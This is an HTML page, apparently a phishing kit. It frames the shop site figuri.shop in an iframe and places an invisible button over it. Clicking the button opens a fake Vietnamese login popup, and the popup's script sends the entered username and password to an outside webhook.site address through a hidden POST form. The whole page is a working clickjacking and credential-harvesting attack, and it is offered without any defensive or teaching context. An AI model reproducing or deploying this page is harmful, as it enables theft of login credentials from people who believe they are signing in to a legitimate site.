<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <title>Gửi form đến Webhook</title>
  <style>
    body {
      margin: 0;
      padding: 0;
    }

    .container {
      position: relative;
      width: 100%;
      height: 800px;
    }

    iframe {
      width: 100%;
      height: 100%;
      border: none;
    }

    .overlay-button {
      position: absolute;
      top: 30px;
      right: 50px;
      width: 300px;
      height: 60px;
      background: transparent;
      border: none;
      z-index: 10;
      cursor: pointer;
    }

    .login-popup {
      display: none;
      position: fixed;
      top: 30%;
      left: 50%;
      transform: translate(-50%, -50%);
      z-index: 100;
      background-color: white;
      border: 1px solid #ccc;
      padding: 20px;
      box-shadow: 0 0 10px rgba(0,0,0,0.4);
    }

    .login-popup input {
      display: block;
      margin: 10px 0;
      padding: 8px;
      width: 100%;
    }

    .login-popup button {
      padding: 8px 16px;
    }

    .overlay-background {
      display: none;
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(0, 0, 0, 0.4);
      z-index: 99;
    }
  </style>
</head>
<body>

  <div class="container">
    <iframe src="https://figuri.shop"></iframe>
    <button class="overlay-button" onclick="showLogin()"></button>
  </div>

  <div class="overlay-background" id="overlayBg" onclick="hideLogin()"></div>

  <div class="login-popup" id="loginPopup">
    <h3>Đăng nhập</h3>
    <form id="loginForm">
      <input type="text" id="username" placeholder="Tên đăng nhập" required>
      <input type="password" id="password" placeholder="Mật khẩu" required>
      <button type="submit">Đăng nhập</button>
    </form>
  </div>

  <script>
   document.getElementById('loginForm').addEventListener('submit', function(e) {
  e.preventDefault();
  
  const form = document.createElement('form');
  form.method = 'POST';
  form.action = 'https://webhook.site/4c4b6cd8-f709-4df9-b9a1-b1380858fd00';

  const input1 = document.createElement('input');
  input1.type = 'hidden';
  input1.name = 'username';
  input1.value = document.getElementById('username').value;

  const input2 = document.createElement('input');
  input2.type = 'hidden';
  input2.name = 'password';
  input2.value = document.getElementById('password').value;

  form.appendChild(input1);
  form.appendChild(input2);

  document.body.appendChild(form);
  form.submit();
});

  </script>

</body>
</html>
